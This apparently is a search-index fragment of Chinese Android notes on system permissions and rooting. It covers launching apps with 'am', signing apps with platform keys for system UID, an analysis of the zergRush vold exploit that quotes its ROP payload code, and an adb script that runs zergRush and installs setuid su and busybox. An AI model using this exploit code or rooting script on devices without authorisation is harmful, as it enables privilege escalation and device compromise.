\u5728Android\u4e2d\uff0c\u9664\u4e86\u4ece\u754c\u9762\u4e0a\u542f\u52a8\u7a0b\u5e8f\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u542f\u52a8\u7a0b\u5e8f\uff0c\u4f7f\u7528\u7684\u662f\u547d\u4ee4\u884c\u5de5\u5177am.\u542f\u52a8\u7684\u65b9\u6cd5\u4e3a $ adb shell $ su # am start -n \uff5b\u5305(package)\u540d\uff5d/\uff5b\u5305\u540d\uff5d.{\u6d3b\u52a8(activity)\u540d\u79f0} \u7a0b\u5e8f\u7684\u5165\u53e3\u7c7b\u53ef\u4ee5\u4ece\u6bcf\u4e2a\u5e94\u7528\u7684AndroidManifest.xml\u7684\u6587\u4ef6\u4e2d\u5f97\u5230\uff0c\u4ee5\u8ba1\u7b97\u5668\uff08calculator\uff09\u4e3a\u4f8b\uff0c\u5b83\u7684 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" \u2026 package=\"com.android.calculator2\" \u2026>\u2026 \u7531\u6b64\u8ba1\u7b97\u5668\uff08calculator\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.calculator2/com.android.calculator2.Calculator \u4e00\u822c\u60c5\u51b5\u5e0c\u671b\uff0c\u4e00\u4e2aAndroid\u5e94\u7528\u5bf9\u5e94\u4e00\u4e2a\u5de5\u7a0b\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6709\u4e00\u4e9b\u5de5\u7a0b\u5177\u6709\u591a\u4e2a\u6d3b\u52a8\uff08activity\uff09\uff0c\u800c\u6709\u4e00\u4e9b\u5e94\u7528\u4f7f\u7528\u4e00\u4e2a\u5de5\u7a0b\u3002\u4f8b\u5982\uff1a\u5728Android\u754c\u9762\u4e2d\uff0cMusic\u548cVideo\u662f\u4e24\u4e2a\u5e94\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u4f7f\u7528\u7684\u90fd\u662fpackages/apps/Music\u8fd9\u4e00\u4e2a\u5de5\u7a0b\u3002\u800c\u5728\u8fd9\u4e2a\u5de5\u7a0b\u7684AndroidManifest.xml\u6587\u4ef6\u4e2d\uff0c\u6709\u5305\u542b\u4e86\u4e0d\u540c\u7684\u6d3b\u52a8\uff08activity\uff09\u3002 Music \u548c Video\uff08\u97f3\u4e50\u548c\u89c6\u9891\uff09\u7684\u542f\u52a8\u65b9\u6cd5\u4e3a\uff1a # am start -n com.android.music/com.android.music.MusicBrowserActivity # am start -n com.android.music/com.android.music.VideoBrowserActivity # am start -n com.android.music/com.android.music.MediaPlaybackActivity \u542f\u52a8\u6d4f\u89c8\u5668 : am start -a android.intent.action.VIEW -d http://www.google.cn/ \u62e8\u6253\u7535\u8bdd : am start -a android.intent.action.CALL -d tel:10086 \u542f\u52a8 google map\u76f4\u63a5\u5b9a\u4f4d\u5230\u5317\u4eac : am start -a android.intent.action.VIEW geo:0,0?q=beijing usage: am [subcommand] [options] start an Activity: am start [-D] [-W] <INTENT> -D: enable debugging -W: wait for launch to complete start a Service: am startservice <INTENT> send a broadcast Intent: am broadcast <INTENT> start an Instrumentation: am instrument [flags] <COMPONENT> -r: print raw results (otherwise decode REPORT_KEY_STREAMRESULT) -e <NAME> <VALUE>: set argument <NAME> to <VALUE> -p <FILE>: write profiling data to <FILE> -w: wait for instrumentation to finish before returning start profiling: am profile <PROCESS> start <FILE> stop profiling: am profile <PROCESS> stop <INTENT> specifications include these flags: [-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>] [-c <CATEGORY> [-c <CATEGORY>] ...] [-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...] [--esn <EXTRA_KEY> ...] [--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...] [-e|--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...] [-n <COMPONENT>] [-f <FLAGS>] [--grant-read-uri-permission] [--grant-write-uri-permission] [--debug-log-resolution] [--activity-brought-to-front] [--activity-clear-top] [--activity-clear-when-task-reset] [--activity-exclude-from-recents] [--activity-launched-from-history] [--activity-multiple-task] [--activity-no-animation] [--activity-no-history] [--activity-no-user-action] [--activity-previous-is-top] [--activity-reorder-to-front] [--activity-reset-task-if-needed] [--activity-single-top] [--receiver-registered-only] [--receiver-replace-pending] [<URI>] \u8fd8\u6709\u4e2a\u7591\u70b9\uff0c\u5c31\u662fsu\u600e\u4e48\u77e5\u9053\u7528\u6237\u662f\u5141\u8bb8root\u6743\u9650\u8fd8\u662f\u53cd\u5bf9\u90a3\uff1f\u539f\u6765\u662f\u4e0a\u9762\u63d0\u5230\u7684\u767d\u540d\u5355\u8d77\u6765\u4f5c\u7528\uff0csuperuser\u628a\u7528\u6237\u7684\u9009\u62e9\u653e\u5165 \uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite \u6570\u636e\u5e93\u4e2d\uff0c\u7136\u540esu\u8fdb\u7a0b\u518d\u53bb\u8bfb\u8be5\u6570\u636e\u5e93\u6765\u5224\u65ad\u662f\u5426\u5141\u8bb8\u3002 static int checkWhitelist() { sqlite3 *db; int rc = sqlite3_open_v2(DBPATH, &db, SQLITE_OPEN_READWRITE, NULL); if (!rc) { char *errorMessage; char query[1024]; sprintf(query, \"select * from whitelist where _id=%d limit 1;\", g_puid); struct whitelistCallInfo callInfo; callInfo.count = 0; callInfo.db = db; rc = sqlite3_exec(db, query, whitelistCallback, &callInfo, &errorMessage); if (rc != SQLITE_OK) { sqlite3_close(db); return 0; } sqlite3_close(db); return callInfo.count; } sqlite3_close(db); return 0; } \u83b7\u53d6\u4e00\u952eroot\u539f\u7406 | \u8f6c\u81ea: http://blog.csdn.net/liujian885/archive/2010/03/22/5404834.aspx \u5728 android\u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u60dc\u65e0\u8bba\u4f60\u600e\u4e48\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u90fd\u662f\u6ca1\u7528\u7684\uff0c\u65e0\u8bba\u6a21\u62df\u5668\u8fd8\u662f\u771f\u673a\uff0c\u5728logcat\u4e2d\u603b\u4f1a\u5f97\u5230\"Unable to open alarm driver: Permission denied \".\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002\u672c\u6765\u4ee5\u4e3a\u5c31\u6ca1\u6709\u529e\u6cd5\u5728\u5e94\u7528\u7a0b\u5e8f\u8fd9\u4e00\u5c42\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\uff0c\u540e\u6765\u5728\u7f51\u4e0a\u641c\u4e86\u597d\u4e45\uff0c\u77e5\u9053\u8fd9\u4e2a\u76ee\u7684\u8fd8\u662f\u53ef\u4ee5\u8fbe\u5230\u7684\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u9ebb\u70e6\u70b9\uff0c\u4e0d\u8fc7\u4e0d\u7528\u5f00\u865a\u62df\u673a\u8dd1\u5230\u6e90\u7801\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u540c\u4e0a\uff0c\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u4e2aapk\u6587\u4ef6\u662f\u4e0d\u80fd\u7528\u7684\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u8fd9\u6b65\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211\u7684Android\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build\\target\\product\\security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build\\tools\\signapk\"\u4e0b\uff0c\u7528\u6cd5\u4e3a\"signapk platform.x509.pem platform.pk8 input.apk output.apk\"\uff0c\u6587\u4ef6\u540d\u6700\u597d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u9632\u6b62\u627e\u4e0d\u5230\uff0c\u4e5f\u53ef\u4ee5\u4fee\u6539\u6e90\u4ee3\u7801\u76f4\u63a5\u4f7f\u7528\u3002 \u8fd9\u6837\u6700\u540e\u5f97\u5230\u7684apk\u548c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u662f\u4e00\u6837\u7684\u3002 \u6700\u540e\u89e3\u91ca\u4e00\u4e0b\u539f\u7406\uff0c\u9996\u5148\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002 \u6700\u6700\u540e\u8fd8\u8bf4\u4e0b\uff0c\u8fd9\u4e2aandroid:sharedUserId\u5c5e\u6027\u4e0d\u53ea\u53ef\u4ee5\u628aapk\u653e\u5230\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2aAPK\u8fd0\u884c\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u5171\u4eab\u6570\u636e\uff0c\u5e94\u8be5\u4f1a\u5f88\u6709\u7528\u7684\u3002 signapk\u7f16\u8bd1\u7ed3\u675f\u540e\u5728 android\u76ee\u5f55\u4e0b/out/host/linux-x86/framework/signapk.jar \u4f7f\u7528\u65b9\u6cd5\uff1ajava -jar signapk.jar platform.x509.pem platform.pk8 test.apk test_signed.apk\u6587\u4ef6\u3002 | \u6f0f\u6d1e \u2014 zergRush \u63d0\u6743\u5b9e\u73b0\u7684\u4ee3\u7801\uff0c\u89c1\uff1a https://github.com/revolutionary/zergRush/blob/master/zergRush.c \u9700\u8981\u4e86\u89e3\u4e00\u4e0b\u662f\u54ea\u4e2a\u5730\u65b9\u6709\u95ee\u9898\uff0c\u8fb9\u5206\u6790\u8fb9\u8bb0\u5f55\u6b64\u6b21\u8fc7\u7a0b\u3002 \u6587\u4ef6\u4e0d\u5927\uff0c\u5f53\u7136\u4ece main \u5165\u624b\u4e86\uff0c if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], \"boomsh\")) do_root(); \u660e\u663e\uff0c\u5f53\u6709\u4e86 Root \u80fd\u529b\u540e\u53bb\u505a\u4e00\u4e2a\u53ef\u4ee5\u4fdd\u6301 Root \u7684\u52a8\u4f5c\uff0c\u731c\u6d4b\uff0c\u6b64\u7a0b\u5e8f\u4f1a\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5e76\u4e14\u518d\u6b21\u8c03\u7528\u7684\u65f6\u5019\u7a0b\u5e8f\u540d\u79f0\u4e3a boomsh \u770b\u4e00\u4e0b do_root \u5427 \u5199\u4e86\u4e00\u4e2a\u5c5e\u6027 ro.kernel.qemu \u4e3a 1 \u660e\u663e\u662f\u8ba9\u624b\u673a\u5f53\u6210\u6a21\u62df\u5668\u8fd0\u884c\uff0c\u89c1 \\android2.32\\system\\core\\adb\\adb.c \u4e2d\u7684\u4ee3\u7801 1. /* run adbd in secure mode if ro.secure is set and 2. ** we are not in the emulator 3. */ 4. property_get(\"ro.kernel.qemu\", value, \"\"); 5. if (strcmp(value, \"1\") != 0) { 6. property_get(\"ro.secure\", value, \"\"); 7. if (strcmp(value, \"1\") == 0) { 8. // don't run as root if ro.secure is set... 9. secure = 1; 10. 11. // ... except we allow running as root in userdebug builds if the 12. // service.adb.root property has been set by the \"adb root\" command 13. property_get(\"ro.debuggable\", value, \"\"); 14. if (strcmp(value, \"1\") == 0) { 15. property_get(\"service.adb.root\", value, \"\"); 16. if (strcmp(value, \"1\") == 0) { 17. secure = 0; 18. } 19. } 20. } 21. } \u4ee5\u540e\u8c03\u7528 adb \u9ed8\u8ba4\u662f Root \u7528\u6237\u4e86\u3002 \u4e0b\u9762\u53c8\u505a\u4e86\u4e00\u4ef6\u4e8b\u628a\u81ea\u5df1\u62f7\u8d1d\u5230 /data/local/tmp/boomsh \u628a SH \u62f7\u8d1d\u5230 /data/local/tmp/sh \u6539\u53d8 /data/local/tmp/boomsh \u7684\u6743\u9650\u4e3a 711 \uff0c\u53ef\u6267\u884c\u4e86 \u7136\u540e\u83b7\u53d6 /system/bin/vold \u7a0b\u5e8f\u7684\u5927\u5c0f\uff0c \u901a\u8fc7 heap_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000; \u8fd9\u6837\u7684\u4e00\u4e2a\u8ba1\u7b97\uff0c\u5f97\u5230\u8be5\u7a0b\u5e8f\u7684\u5806\u5730\u5740\uff0c \u6709\u70b9\u610f\u601d\u4e86\uff0c\u5bf9 vold \u7a0b\u5e8f\u6709\u4e86\u6b6a\u8111\u7b4b\u4e86 \u7528\u8fc7\u5728\u624b\u673a\u4e0a\u7528 ps \u770b\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u6709\u662f\u4ece root \u7528\u6237\u6267\u884c\u8fc7\u6765\u7684\u3002 \u7136\u540e\u83b7\u53d6\u4e86\u4e00\u4e0b\u624b\u673a\u7684\u7248\u672c\u53f7\uff0c\u53ea\u5bf9 2.2 2.3 \u4e8c\u4e2a\u7248\u672c\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u4fee\u6b63\u4e86\u4e00\u4e0a heap_addr \u7684\u5730\u5740\u3002 \u7136\u540e\u53c8\u627e\u4e86\u4e00\u4e0b system \u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u7684\u5730\u5740\uff0c\u653e\u5230 system_ptr \u4e2d \u7ee7\u7eed\u770b checkcrash() \u6e05\u9664\u4e86\u4e00\u4e0b logcat \u65e5\u5fd7 \u5220\u9664 /data/local/tmp/crashlog \u6587\u4ef6 \u7b80\u7acb\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u53bb\u751f\u6210\u4e00\u4e0b crashlog \u6587\u4ef6\u3002 \u8c03\u7528 do_fault \u6253\u5f00 crashlog \u6587\u4ef6 \u5728 crashlog \u4e2d\u627e\u5230\u5d29\u6e83\u4fe1\u606f\uff0c\u627e\u5230 sp \u5bc4\u5b58\u5668\u5730\u5740\u3002 \u7b49\u7b49\uff0c\u4e3a\u4ec0\u4e48\u5d29\u6e83\u5462\uff0c\u80af\u5b9a\u662f\u5728 do_fault \u4e2d\u5236\u9020\u7684\uff0c\u6211\u4eec\u8981\u770b\u770b\u8fd9\u5757\u4e86 \u8fd9\u4e2a\u51fd\u6570\u6bd4\u8f83\u4e71\uff0c\u627e\u627e\u91cd\u70b9\u770b if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) \u4e0d\u9519\u7684\u4fe1\u606f\uff0c\u8fde\u63a5 vold \uff0c\u53c8\u662f\u5b83\uff0c\u4ee5\u524d\u542c\u8bf4\u8fc7\u5b83\u6709\u6f0f\u6d1e\uff0c\u8fd9\u6b21\u8fd8\u662f\u5b83\u3002 write(sock, buf, n+1) \u5199\u4e86\u4e00\u4e9b\u4fe1\u606f\uff0c\u4e0d\u77e5\u9053\u4ec0\u4e48\u4fe1\u606f\uff0c\u4f46\u662f\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u80fd\u8ba9 vold \u5d29\u6e83\u7684\u4fe1\u606f\u3002 \u4e0b\u9762\u56de\u5230 main \u7ee7\u7eed\uff01 \u4e00\u4e2a For \u5faa\u73af\u5904\u7406\u3002 find_stack_addr \u7528\u4e86\u4e0a\u9762\u7684\u76f8\u540c\u65b9\u6cd5\uff0c\u4ece\u5d29\u6e83\u4fe1\u606f\u4e2d\u627e\u5230\u7a0b\u5e8f\u7684\u6808\u5730\u5740\uff0c\uff08\u81f3\u4e8e\u600e\u4e48\u8ba1\u7b97\u7684\uff0c\u4ee5\u540e\u518d\u53bb\u7814\u7a76\u4e86\uff09 \u4e00\u4e9b\u5bb9\u9519\u68c0\u67e5\uff0c\u7565\u8fc7\uff01 kill(logcat_pid, SIGKILL); unlink(crashlog); find_rop_gadgets() \u53c8\u4e00\u4e2a\u964c\u751f\u51fd\u6570\u3002\u770b\u4e86\uff0c\u6682\u65f6\u770b\u4e0d\u51fa\u7528\u9014\uff0c\u8c8c\u4f3c\u627e\u70b9\u4ec0\u4e48\uff0c\u7ee7\u7eed\uff01 \u4e0b\u9762\u5c31\u662f\u518d\u6b21\u8c03\u7528 do_fault ,\u751f\u6210\u5d29\u6e83\u3002 \u518d\u6b21\u5224\u65ad sh \u662f\u5426\u6709\u6ca1\u6709 s \u4f4d\uff0c \u5982\u679c\u6709\u4e86\uff0c\u521a ROOT \u529f\u4e86\u3002 \u7591\u95ee\u6765\u4e86\uff0c\u6ca1\u53d1\u73b0\u600e\u4e48\u518d\u6b21\u8c03\u7528 boomsh \u8fd0\u884c\u6267\u884c do_root \u554a\u3002 \u987a\u7740\u5b83\u62f7\u8d1d\u51fa\u6765\u7684 sh \u6587\u4ef6\u627e\u627e\uff0c\u641c\u7d22 bsh \u53d8\u7406\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u5982\u4e0b\u5730\u65b9\uff1a 1. static **int** do_fault() 2. { 3. **char** buf[255]; 4. **int** sock = -1, n = 0, i; 5. **char** s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5]; 6. uint32_t bsh_addr; 7. **char** padding[128]; 8. int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz); 9. 10. memset(padding, 0, 128); 11. strcpy(padding, \"LORDZZZZzzzz\"); 12. if(padding_sz > 0) { 13. memset(padding+12, 'Z', padding_sz); 14. printf(\"[*] Poping %d more zerglings\\n\", padding_sz); 15. } 16. else if(padding_sz < 0) { 17. memset(padding, 0, 128); 18. memset(padding, 'Z', 12+padding_sz); 19. } 20. 21. if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) 22. die(\"[-] Error creating Nydus\"); 23. 24. sprintf(s_stack_addr, \"%c%c%c%c\", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff); 25. sprintf(s_stack_pivot_addr, \"%c%c%c%c\", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff); 26. sprintf(s_pop_r0_addr, \"%c%c%c%c\", pop_r0 & 0xff, (pop_r0>>8)&0xff, (pop_r0>>16)&0xff, (pop_r0>>24)&0xff); 27. sprintf(s_system, \"%c%c%c%c\", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff); 28. sprintf(s_heap_addr, \"%c%c%c%c\", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff); 29. 30. strcpy(buf, \"ZERG\"); 31. strcat(buf, \" ZZ \"); 32. strcat(buf, s_stack_pivot_addr); 33. for(i=3; i < buffsz+1; i++) 34. strcat(buf, \" ZZZZ\"); 35. strcat(buf, \" \"); 36. strcat(buf, s_heap_addr); 37. 38. n = strlen(buf); 39. bsh_addr = stack_addr + n + 1 + 8 + 8 + 8 + padding_sz + 12 + 4; 40. 41. if(check_addr(bsh_addr) == -1) { 42. printf(\"[-] Colossus, we're doomed!\\n\"); 43. exit(-1); 44. } 45. 46. sprintf(s_bsh_addr, \"%c%c%c%c\", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff); 47. 48. <strong><span style=\"color:#ffffff;BACKGROUND-COLOR: #ff0000\">n += sprintf(buf+n+1, \"%s%s OVER%s%s%s%sZZZZ%s%c\", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);</span></strong> 49. 50. printf(\"[*] Sending %d zerglings ...\\n\", n); 51. 52. if ((n = write(sock, buf, n+1)) < 0) 53. die(\"[-] Nydus seems broken\"); 54. 55. sleep(3); 56. close(sock); 57. 58. return n; 59. } \u770b\u5230\u4e0a\u9762\u52a0\u8272\u7684\u884c\u4e86\uff0c\u539f\u6765\u4ed6\u662f\u7528 socket \u5199\u7684\u4e00\u4e2a shell code \uff0c\u8c03\u7528\u4e86\u4ed6\u62f7\u8d1d\u7684 sh \u7a0b\u5e8f\u3002 \u5728 vold \u4e2d\u6267\u884c sh \u80af\u5b9a\u662f root \u554a\u3002 \u81f3\u6b64\uff0c\u539f\u7406\u5f88\u662f\u6e05\u695a\u4e86\uff0c shell code \u561b\uff0c\u8fd0\u884c\u7684\u65f6\u5019\u628a\u4ed6 dump \u51fa\u6765\u7528\u522b\u7684\u5de5\u5177\u770b\u5427\uff01 **\u4e00\u952eROOT\u811a\u672c** 1.\u7b49\u5f85\u8bbe\u5907\u8fde\u63a5 adb wait-for-device 2.\u5220\u9664\u6587\u4ef6 adb shell \"cd /data/local/tmp/; rm *\" 3.\u4e0a\u4f20zergRush\u5e76\u4fee\u6539\u5c5e\u6027\u53bb\u6267\u884c adb push c:\\zergRush /data/local/tmp/ adb shell \"chmod 777 /data/local/tmp/zergRush\" adb shell \"/data/local/tmp/zergRush\" adb wait-for-device 4.\u4e0a\u4f20busybox\u3001\u7ed9busybox\u6587\u4ef6\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ef\u4ee5\u65b9\u5f0f\u52a0\u8f7d\u6587\u4ef6\u7cfb\u7edf adb push c:\\busybox /data/local/tmp/ adb shell \"chmod 755 /data/local/tmp/busybox\" adb shell \"/data/local/tmp/busybox mount -o remount,rw /system\" 5.\u590d\u5236busybox\uff0c\u4fee\u6539\u6240\u5728\u7684\u7ec4\u53ca\u8bbe\u7f6es\u4f4d adb shell \"dd if=/data/local/tmp/busybox of=/system/xbin/busybox\" adb shell \"chown root.shell /system/xbin/busybox\" adb shell \"chmod 04755 /system/xbin/busybox\" 6.\u5b89\u88c5busybox\u5e76\u5220\u9664\u4e34\u65f6\u6587\u4ef6 adb shell \"/system/xbin/busybox --install -s /system/xbin\" adb shell \"rm -rf /data/local/tmp/busybox\" 7.\u5bf9su\u8fdb\u884c\u7c7b\u4f3cbusybox\u7684\u5904\u7406 adb push c:\\fu /system/bin/su adb shell \"chown root.shell /system/bin/su\" adb shell \"chmod 06755 /system/bin/su\" adb shell \"rm /system/xbin/su\" adb shell \"ln -s /system/bin/su /system/xbin/su\" 8.\u5b89\u88c5\u5176\u5b83\u5de5\u5177 adb push c:\\superuser.apk /system/app/ adb shell \"cd /data/local/tmp/; rm *\" adb reboot adb wait-for-device adb install c:\\recovery.apk \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/superkris/article/details/7709504","title":"Android\u7cfb\u7edf\u6743\u9650\u548croot\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#androidroot","text":"","title":"Android\u7cfb\u7edf\u6743\u9650\u548croot\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android","text":"Android\u7cfb\u7edf\u662f\u8fd0\u884c\u5728Linux\u5185\u6838\u4e0a\u7684\uff0cAndroid\u4e0eLinux\u5206\u522b\u6709\u81ea\u5df1\u7684\u4e00\u5957\u4e25\u683c\u7684\u5b89\u5168\u53ca\u6743\u9650\u673a\u5236\uff0c Android\u7cfb\u7edf\u6743\u9650\u76f8\u5173\u7684\u5185\u5bb9\uff0c \uff08\u4e00\uff09linux\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6743\u9650 -rwxr-x--x system system 4156 2012-06-30 16:12 test.apk. \u4ee3\u8868\u7684\u662f\u76f8\u5e94\u7684\u7528\u6237/\u7528\u6237\u7ec4\u53ca\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4e0e\u6b64\u6587\u4ef6\u8fd0\u884c\u8d77\u6765\u5177\u6709\u7684\u6743\u9650\u5b8c\u5168\u4e0d\u76f8\u5173\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bf4\u660esystem\u7528\u6237\u62e5\u6709\u5bf9\u6b64\u6587\u4ef6\u7684\u8bfb\u5199\u6267\u884c\u6743\u9650\uff1bsystem\u7ec4\u7684\u7528\u6237\u5bf9\u6b64\u6587\u4ef6\u62e5\u6709\u8bfb\u3001\u6267\u884c\u6743\u9650\uff1b\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u53ea\u5177\u6709\u6267\u884c\u6743\u9650\u3002\u800ctest.apk\u8fd0\u884c\u8d77\u6765\u540e\u53ef\u4ee5\u5e72\u54ea\u4e9b\u4e8b\u60c5\uff0c\u8ddf\u8fd9\u4e2a\u5c31\u4e0d\u76f8\u5173\u4e86\u3002 